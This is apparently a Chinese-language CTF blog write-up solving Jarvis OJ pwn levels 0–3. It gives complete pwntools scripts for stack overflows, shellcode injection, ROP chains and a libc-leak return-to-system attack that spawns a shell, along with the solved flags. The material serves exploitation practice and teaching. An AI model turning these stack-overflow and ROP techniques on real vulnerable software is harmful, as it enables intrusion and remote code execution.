---
title: Jarvis_OJ_pwn_level1to3
date: 2020-07-08 17:55:21
tags: 
- pwn
categories:
- CTF
---
# level0
x86栈溢出
## exp1
```python
from pwn import *
#nc pwn2.jarvisoj.com 9881
io = remote("pwn2.jarvisoj.com",9881)


io.recvuntil("Hello, World\n")
payload = b'a'*0x88 +p64(0x0400596)

io.sendline(payload)
io.interactive()

# CTF{713ca3944e92180e0ef03171981dcd41}
```

# level1

x86栈溢出 + pwntools自带的x86 shellcode使用

保护全灰,可以写shellcode了

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial

```cpp
ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  printf("What's this:%p?\n", &buf);
  return read(0, &buf, 0x100u);
}
```
这里会输出buf的地址，在buf内设置shellcode，然后覆盖堆栈将ret跳转的目标修改到buf的开头（即 set ip 到shellcode的起始点）然后执行shellcode，再进交互系统

## exp2
```python
from pwn import *
context( arch = 'i386')
# 先选相应系统
# log_level = 'debug'

#io = process('./level1')
io = remote('pwn2.jarvisoj.com', 9877)
shellcode = asm(shellcraft.sh())
#print("shell:\n",shellcraft.sh())

# What's this:0x ffb0aa80 ?\n

buf = int(io.recvline()[14: -2], 16)

payload = shellcode + b'\x90' * (0x88 + 0x4 - len(shellcode)) 
payload += p32(buf) #修改 ret 跳转目标
io.send(payload)
io.interactive()


# CTF{82c2aa534a9dede9c3a0045d0fec8617}
```



# level2

x86栈溢出 + x86传参规律

```python
from pwn import *
#设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口
r = remote("pwn2.jarvisoj.com", 9878)
# nc pwn2.jarvisoj.com 9878
system=0x08048320
#r.recvuntil('Input:')
sh = 0x0804A024

payload = b'a' * (0x88+4) + p32(system)+ p32(0) +p32(sh)

r.recvline("Input:")
r.sendline(payload)

r.interactive()

# 0804A024 /bin/sh
# 08048320 system
```

又由于调用函数压参数是逆序，所以将system唯一一个参数放在system的返回位置后面一个位置就ok了

# level2 x64

先用ROPgadget找程序内有没有 pop rdi 可用拿来用 (ROPgadget真是好东西)

```shell
0x00000000004006b3 : pop rdi ; ret
```

pop rdi 把binsh_addr传入rdi

ret 把system_addr 给 rip

就变成了执行 system ( [rdi] )

## exp
```python
from pwn import *
system_addr=0x000000000040063E
poprdi_drt=0x00000000004006b3
binsh_addr=0x0000000000600A90
p=remote("pwn2.jarvisoj.com",9882)
p.recvline()
payload=b'A'*0x80+b"A"*8+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr)
p.send(payload)
p.interactive()
'''
x64 优先使用用寄存器传参
rdi, rsi, rdx, rcx, r8, r9。当参数为 7 个以上时， 
前 6 个与前面一样， 但后面的依次从 "右向左" 放入栈中。
CTF{081ecc7c8d658409eb43358dcc1cf446}
'''
```

# level3  x86

锁了 NX ,要泄露 libc

之前没怎么看懂泄露 libc的操作，这两天闲着看了看算是看明白了

```python
from pwn import *
io = remote('pwn2.jarvisoj.com',9879)
write_plt=0x8048340
read = 0x804844B
write_got=0x804A018
payload1 = b'a' * (0x88 + 0x4) + p32(write_plt) + p32(read) + p32(0x01) + p32(write_got) + p32(0x04)

io.recvuntil('Input:\n')
io.sendline(payload1)
write_add = u32(io.recv(4))

# 计算system函数和/bin/sh在内存中的真实地址
libc = ELF('./libc-2.19.so')

t = write_add - libc.symbols['write']
system = t + libc.symbols['system']
binsh = t + next(libc.search(b'/bin/sh'))

payload2 = b'a'*(0x88 + 0x4) 
payload2 += p32(system) + p32(0) + p32(binsh)

io.recvuntil('Input:\n')
io.sendline(payload2)
io.interactive()
io.close()
```

> 好像只要是程序和libc里面有的函数都可以拿来泄露...



每次运行内存中的位置会发生变化



溢出修改ret跳转值


执行到write内部，函数将 write_got 作为参数输出在了屏幕上

# level3 x64

和x86版的区别是传参要借助寄存器,所以要找 pop 来传参(话说传参方式应该还有很多吧?)

```cpp
--> 0x00000000004006b3 : pop rdi ; ret
--> 0x00000000004006b1 : pop rsi ; pop r15 ; ret
```

```python
from pwn import *
p=remote("pwn2.jarvisoj.com", "9883")

elf=ELF('./level3_x64')
libc=ELF('./libc-2.19.so')

context.log_level="debug"

main_add=0x4005e6
writeplt=elf.symbols['write']
writegot=elf.got['write']
rdiset=0x00000000004006b3  # 1 

rsiset=0x00000000004006b1 #2


payload0 = 0x88*b'a'
payload0+=p64(rdiset)
payload0+=p64(1) #  1 赋给 rdi
payload0+=p64(rsiset) 
payload0+=p64(writegot) # writegot 给 rsi

payload0+=p64(8) # 跳过 r15
payload0+=p64(writeplt)# write(1,writegot,0x200) rdx的0x200是read给的

payload0+=p64(main_add)

p.recvuntil("Input:\n")
p.sendline(payload0)

writeaddr=p.recv(8)# 收集 writegot 地址
writeaddr=u64(writeaddr)

sysoffest=libc.symbols['system']
binoffest=next(libc.search(b'/bin/sh'))
t = writeaddr - libc.symbols['write']
system=sysoffest + t
sh=binoffest + t

payload1 = b'a'*0x88
payload1 += p64(rdiset)
payload1 += p64(sh)+p64(system)

p.recvuntil("Input:\n")
p.sendline(payload1)
p.interactive()

```
